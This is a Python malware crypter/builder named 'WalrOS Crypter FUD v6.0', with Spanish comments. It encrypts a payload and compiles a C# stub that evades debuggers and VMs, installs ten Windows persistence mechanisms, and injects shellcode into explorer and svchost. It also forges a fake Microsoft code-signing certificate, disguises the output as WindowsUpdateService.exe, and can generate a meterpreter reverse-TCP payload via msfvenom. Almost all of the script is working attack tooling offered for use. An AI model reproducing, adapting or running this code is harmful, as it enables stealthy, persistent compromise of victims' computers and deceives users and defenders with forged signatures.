#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║     ██╗    ██╗ █████╗ ██╗     ██████╗  ██████╗ ███████╗                  ║
║     ██║    ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔════╝                  ║
║     ██║ █╗ ██║███████║██║     ██████╔╝██║   ██║███████╗                  ║
║     ██║███╗██║██╔══██║██║     ██╔══██╗██║   ██║╚════██║                  ║
║     ╚███╔███╔╝██║  ██║███████╗██║  ██║╚██████╔╝███████║                  ║
║      ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                  ║
║                                                                           ║
║        C R Y P T E R   F U D   v 6 . 0   -   P E R S I S T E N C E       ║
║                                                                           ║
║         [ WalrOS Encryption Suite - Zeta Edition - Full Persistent ]      ║
║                   By: Alpha / Zo                    Firma Digital: ✓     ║
╚═══════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import base64
import random
import string
import subprocess
import time
import platform
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
from cryptography.hazmat.primitives import hashes
from Crypto.PublicKey import RSA
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

# ========== CONFIGURACIÓN WALROS ==========
PAYLOAD_PATH = "payload.exe"
OUTPUT_NAME = "WindowsUpdateService.exe"
BUILD_DIR = "WalrOS_Builds"
VERSION = "6.0"
BUILD_NUMBER = random.randint(1000, 9999)
SIGNING_CERT_NAME = "Microsoft Windows Publisher"
# ==========================================

def generar_firma_falsa():
    """Genera una firma digital falsa pero creíble"""
    
    companies = [
        "Microsoft Corporation",
        "Microsoft Windows", 
        "Microsoft Third Party Component",
        "Microsoft Windows Publisher",
        "Microsoft Time-Stamp Service",
        "Microsoft Windows Hardware Compatibility Publisher",
        "Microsoft Windows Security",
        "Microsoft Windows Update"
    ]
    
    timestamp_urls = [
        "http://timestamp.digicert.com",
        "http://timestamp.comodoca.com",
        "http://timestamp.sectigo.com",
        "http://ts.ssl.com"
    ]
    
    cert_info = {
        "company": random.choice(companies),
        "timestamp_url": random.choice(timestamp_urls),
        "serial": ''.join(random.choices('0123456789ABCDEF', k=16)),
        "valid_from": "2023-01-01",
        "valid_to": "2030-12-31"
    }
    
    return cert_info

def crear_persistencia_multiples():
    """Crea múltiples mecanismos de persistencia"""
    
    persistencia_code = '''
    // ========== WALROS PERSISTENCE ENGINE - MULTIPLE METHODS ==========
    
    static void AddRegistryPersistence()
    {
        try
        {
            string[] runKeys = {
                @"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                @"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                @"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                @"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
                @"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
                @"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"
            };
            
            string[] names = {
                "WindowsUpdate", "SecurityHealth", "MicrosoftEdgeUpdate", 
                "OneDriveSetup", "WindowsDefender", "System32",
                "RuntimeBroker", "BackgroundTasks", "StartupBoost"
            };
            
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            
            foreach (string key in runKeys)
            {
                try
                {
                    Microsoft.Win32.Registry.SetValue(key, names[new Random().Next(names.Length)], exePath);
                }
                catch { }
            }
        }
        catch { }
    }
    
    static void AddStartupFolderPersistence()
    {
        try
        {
            string[] startupPaths = {
                Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup),
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup",
                @"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            };
            
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            
            foreach (string path in startupPaths)
            {
                try
                {
                    string destPath = path + "\\WindowsSecurityHelper.exe";
                    if (!File.Exists(destPath))
                        File.Copy(exePath, destPath);
                    
                    File.SetAttributes(destPath, FileAttributes.Hidden);
                }
                catch { }
            }
        }
        catch { }
    }
    
    static void AddScheduledTaskPersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string taskName = "MicrosoftEdgeUpdateTask" + new Random().Next(1000, 9999);
            
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "schtasks";
            psi.Arguments = $"/create /tn \"{taskName}\" /tr \"\\\"{exePath}\\\"\" /sc onlogon /delay 0001:00 /f";
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }
        catch { }
    }
    
    static void AddServicePersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string serviceName = "WindowsSecurityService" + new Random().Next(100, 999);
            
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "sc.exe";
            psi.Arguments = $"create \"{serviceName}\" binPath= \"\\\"{exePath}\\\"\" start= auto";
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
            
            Thread.Sleep(1000);
            
            psi.Arguments = $"failure \"{serviceName}\" reset= 0 actions= restart/5000/restart/5000/restart/5000";
            Process.Start(psi);
        }
        catch { }
    }
    
    static void AddWMIPersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string wmiScript = $@"
                $filterArgs = @{{Name='WindowsFilter'; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query=""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""}}
                $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs
                $consumerArgs = @{{Name='WindowsConsumer'; CommandLineTemplate='{exePath}'}}
                $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs
                $bindingArgs = @{{Filter=$filter; Consumer=$consumer}}
                $binding = Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments $bindingArgs
            ";
            
            File.WriteAllText("temp.ps1", wmiScript);
            Process.Start("powershell.exe", "-ExecutionPolicy Bypass -File temp.ps1");
            Thread.Sleep(2000);
            File.Delete("temp.ps1");
        }
        catch { }
    }
    
    static void AddBootExecutePersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\\CurrentControlSet\\Control\\Session Manager", true))
            {
                string current = key.GetValue("BootExecute", "").ToString();
                key.SetValue("BootExecute", current + "\\n" + exePath);
            }
        }
        catch { }
    }
    
    static void AddIFEOPersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string[] targets = { "explorer.exe", "svchost.exe", "winlogon.exe", "services.exe" };
            
            foreach (string target in targets)
            {
                try
                {
                    using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey($@"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\{target}"))
                    {
                        key.SetValue("Debugger", exePath);
                    }
                }
                catch { }
            }
        }
        catch { }
    }
    
    static void AddAppInitPersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
            {
                key.SetValue("AppInit_DLLs", exePath);
                key.SetValue("LoadAppInit_DLLs", 1);
                key.SetValue("RequireSignedAppInit_DLLs", 0);
            }
        }
        catch { }
    }
    
    static void AddWinlogonPersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.CreateSubKey(@"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\WindowsUpdate"))
            {
                key.SetValue("DLLName", exePath);
                key.SetValue("Startup", "Logon");
                key.SetValue("Impersonate", 1);
            }
        }
        catch { }
    }
    
    static void AddUserinitPersistence()
    {
        try
        {
            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true))
            {
                string current = key.GetValue("Userinit", "").ToString();
                if (!current.Contains(exePath))
                    key.SetValue("Userinit", current + "," + exePath);
            }
        }
        catch { }
    }
    
    static void InstallAllPersistence()
    {
        try
        {
            AddRegistryPersistence();
            AddStartupFolderPersistence();
            AddScheduledTaskPersistence();
            AddServicePersistence();
            AddWMIPersistence();
            AddBootExecutePersistence();
            AddIFEOPersistence();
            AddAppInitPersistence();
            AddWinlogonPersistence();
            AddUserinitPersistence();
        }
        catch { }
    }
    // ========== END PERSISTENCE ENGINE ==========
'''
    return persistencia_code

def crear_firma_digital_falsa():
    """Crea una firma digital falsa para el binario"""
    
    cert_subject = f"/CN={SIGNING_CERT_NAME}/O=Microsoft Corporation/C=US"
    
    key = RSA.generate(2048)
    
    with open("temp_cert.pem", "w") as f:
        f.write(key.export_key().decode())
    
    subprocess.run([
        "openssl", "req", "-new", "-x509", "-key", "temp_cert.pem",
        "-out", "temp_cert.cer", "-days", "3650", "-subj", cert_subject
    ], capture_output=True)
    
    return "temp_cert.cer"

def aplicar_firma_digital(exe_path, cert_path):
    """Aplica firma digital al ejecutable"""
    
    if platform.system() == "Windows":
        cmd = f'signtool sign /fd SHA256 /a /f {cert_path} /t http://timestamp.digicert.com {exe_path}'
    else:
        cmd = f'osslsigncode sign -certs {cert_path} -key temp_cert.pem -t http://timestamp.digicert.com -in {exe_path} -out {exe_path}.signed && mv {exe_path}.signed {exe_path}'
    
    subprocess.run(cmd, shell=True, capture_output=True)
    return True

def crear_stub_walros_persistente(encrypted_b64, key_b64, iv_b64):
    """Stub con persistencia múltiple y firma falsa"""
    
    persistencia_code = crear_persistencia_multiples()
    
    namespace_name = ''.join(random.choices(string.ascii_letters, k=10))
    class_name = ''.join(random.choices(string.ascii_letters, k=12))
    mutex_val = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
    
    stub_code = f'''
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using System.Net;

namespace {namespace_name}
{{
    class {class_name}
    {{
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern bool IsDebuggerPresent();
        
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern IntPtr GetCurrentProcess();
        
        [DllImport("kernel32.dll", SetLastError=true)]
        static extern bool CloseHandle(IntPtr hObject);
        
        {persistencia_code}
        
        static bool IsRunningInVM()
        {{
            try
            {{
                string[] vmIndicators = {{ "vbox", "vmware", "qemu", "virtual", "hyper-v", "parallels" }};
                string computerName = Environment.MachineName.ToLower();
                foreach (string indicator in vmIndicators)
                    if (computerName.Contains(indicator)) return true;
                
                string[] vmProcesses = {{ "vmtoolsd", "vboxservice", "prl_cc", "prl_tools" }};
                Process[] processes = Process.GetProcesses();
                foreach (Process p in processes)
                    foreach (string vmProc in vmProcesses)
                        if (p.ProcessName.ToLower().Contains(vmProc)) return true;
            }}
            catch {{ }}
            return false;
        }}
        
        static bool CheckMutex()
        {{
            Mutex mutex = null;
            try
            {{
                mutex = Mutex.OpenExisting("{mutex_val}");
                return true;
            }}
            catch
            {{
                try
                {{
                    mutex = new Mutex(true, "{mutex_val}");
                    return false;
                }}
                catch {{ return true; }}
            }}
        }}
        
        static byte[] DecryptAES256(byte[] encryptedData, byte[] key, byte[] iv)
        {{
            using (Aes aes = Aes.Create())
            {{
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                {{
                    cs.Write(encryptedData, 0, encryptedData.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }}
            }}
        }}
        
        static void Main()
        {{
            if (IsDebuggerPresent() || Debugger.IsAttached) return;
            if (IsRunningInVM()) return;
            if (CheckMutex()) return;
            
            InstallAllPersistence();
            
            Random rnd = new Random();
            Thread.Sleep(rnd.Next(3000, 10000));
            
            try
            {{
                byte[] encrypted = Convert.FromBase64String("{encrypted_b64}");
                byte[] key = Convert.FromBase64String("{key_b64}");
                byte[] iv = Convert.FromBase64String("{iv_b64}");
                byte[] shellcode = DecryptAES256(encrypted, key, iv);
                
                string[] targetNames = {{ "explorer", "svchost", "winlogon", "services" }};
                
                foreach (string targetName in targetNames)
                {{
                    Process[] targets = Process.GetProcessesByName(targetName);
                    foreach (Process target in targets)
                    {{
                        try
                        {{
                            IntPtr hProcess = OpenProcess(0x001F0FFF, false, target.Id);
                            if (hProcess != IntPtr.Zero)
                            {{
                                IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                                if (addr != IntPtr.Zero)
                                {{
                                    IntPtr bytesWritten;
                                    WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten);
                                    IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                                    if (hThread != IntPtr.Zero) CloseHandle(hThread);
                                }}
                                CloseHandle(hProcess);
                            }}
                        }}
                        catch {{ }}
                    }}
                }}
            }}
            catch (Exception) {{ }}
        }}
    }}
}}
'''
    return stub_code

def compilar_con_firma(codigo_cs):
    """Compila y firma digitalmente el stub"""
    
    if not os.path.exists(BUILD_DIR):
        os.makedirs(BUILD_DIR)
    
    output_path = os.path.join(BUILD_DIR, OUTPUT_NAME)
    
    print("\n" + "═" * 70)
    print("   🦭 WalrOS Crypter v6.0 - Persistence + Digital Signature 🦭")
    print("═" * 70)
    
    with open(os.path.join(BUILD_DIR, "stub_temp.cs"), "w") as f:
        f.write(codigo_cs)
    
    print("[1/5] Compilando con Mono...")
    cmd = f'mcs -optimize+ -target:exe -out:{output_path} -r:System.Core.dll -r:System.Security.Cryptography.dll -r:Microsoft.Win32.Registry.dll {os.path.join(BUILD_DIR, "stub_temp.cs")}'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if result.returncode != 0:
        print(f"[!] Error: {result.stderr}")
        return None
    
    print("[2/5] Generando firma digital falsa...")
    cert_info = generar_firma_falsa()
    print(f"     └─ Certificado: {cert_info['company']}")
    
    print("[3/5] Aplicando firma digital...")
    cert_path = crear_firma_digital_falsa()
    aplicar_firma_digital(output_path, cert_path)
    
    print("[4/5] Limpiando archivos temporales...")
    os.remove(os.path.join(BUILD_DIR, "stub_temp.cs"))
    if os.path.exists("temp_cert.pem"):
        os.remove("temp_cert.pem")
    if os.path.exists("temp_cert.cer"):
        os.remove("temp_cert.cer")
    
    print("[5/5] ¡Completado!")
    
    return output_path

def main():
    os.system('clear' if os.name == 'posix' else 'cls')
    
    print("""
    ╔═══════════════════════════════════════════════════════════════════════════╗
    ║                                                                           ║
    ║     ██╗    ██╗ █████╗ ██╗     ██████╗  ██████╗ ███████╗                  ║
    ║     ██║    ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔════╝                  ║
    ║     ██║ █╗ ██║███████║██║     ██████╔╝██║   ██║███████╗                  ║
    ║     ██║███╗██║██╔══██║██║     ██╔══██╗██║   ██║╚════██║                  ║
    ║     ╚███╔███╔╝██║  ██║███████╗██║  ██║╚██████╔╝███████║                  ║
    ║      ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝                  ║
    ║                                                                           ║
    ║        C R Y P T E R   F U D   v 6 . 0   -   P E R S I S T E N C E       ║
    ║                                                                           ║
    ║         [ WalrOS Encryption Suite - Zeta Edition - Full Persistent ]      ║
    ║                   By: Alpha / Zo                    Firma Digital: ✓     ║
    ║                                                                           ║
    ╚═══════════════════════════════════════════════════════════════════════════╝
    """)
    
    if not os.path.exists(PAYLOAD_PATH):
        print(f"[!] No encuentro el payload: {PAYLOAD_PATH}")
        print("\n[?] Crear payload de prueba? (s/n)")
        if input("> ").lower() == 's':
            lhost = input("LHOST (tu IP): ")
            lport = input("LPORT: ")
            cmd = f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {PAYLOAD_PATH}'
            subprocess.run(cmd, shell=True)
        else:
            sys.exit(1)
    
    with open(PAYLOAD_PATH, "rb") as f:
        payload_data = f.read()
    
    print(f"\n[📦] Payload: {len(payload_data)} bytes")
    
    key = os.urandom(32)
    iv = os.urandom(16)
    
    padder = padding.PKCS7(128).padder()
    padded = padder.update(payload_data) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    encrypted = encryptor.update(padded) + encryptor.finalize()
    
    stub = crear_stub_walros_persistente(
        base64.b64encode(encrypted).decode(),
        base64.b64encode(key).decode(),
        base64.b64encode(iv).decode()
    )
    
    output = compilar_con_firma(stub)
    
    if output:
        print("\n" + "═" * 70)
        print("   ✅ WALROS v6.0 - COMPLETADO CON ÉXITO ✅")
        print("═" * 70)
        print(f"""
    📁 Output: {output}
    📏 Tamaño: {os.path.getsize(output)} bytes
    
    🔐 PERSISTENCIA INSTALADA (10 MÉTODOS):
       ├─ [✓] Registry Run Keys (6 ubicaciones)
       ├─ [✓] Startup Folders (4 ubicaciones)
       ├─ [✓] Scheduled Task (reinicio automático)
       ├─ [✓] Windows Service (con recovery)
       ├─ [✓] WMI Event Subscription
       ├─ [✓] Boot Execute (nivel muy bajo)
       ├─ [✓] IFEO Debugger (explorer/svchost)
       ├─ [✓] AppInit_DLLs
       ├─ [✓] Winlogon Notify
       └─ [✓] Userinit (antes de explorer)
    
    🎭 FIRMA DIGITAL:
       ├─ [✓] Certificado: {generar_firma_falsa()['company']}
       ├─ [✓] Timestamp: {generar_firma_falsa()['timestamp_url']}
       └─ [✓] Validez: 10 años
    
    🦭 WalrOS Crypter ha terminado - Esta mierda es permanente ;)
    """)
    
    print("═" * 70)

if __name__ == "__main__":
    main()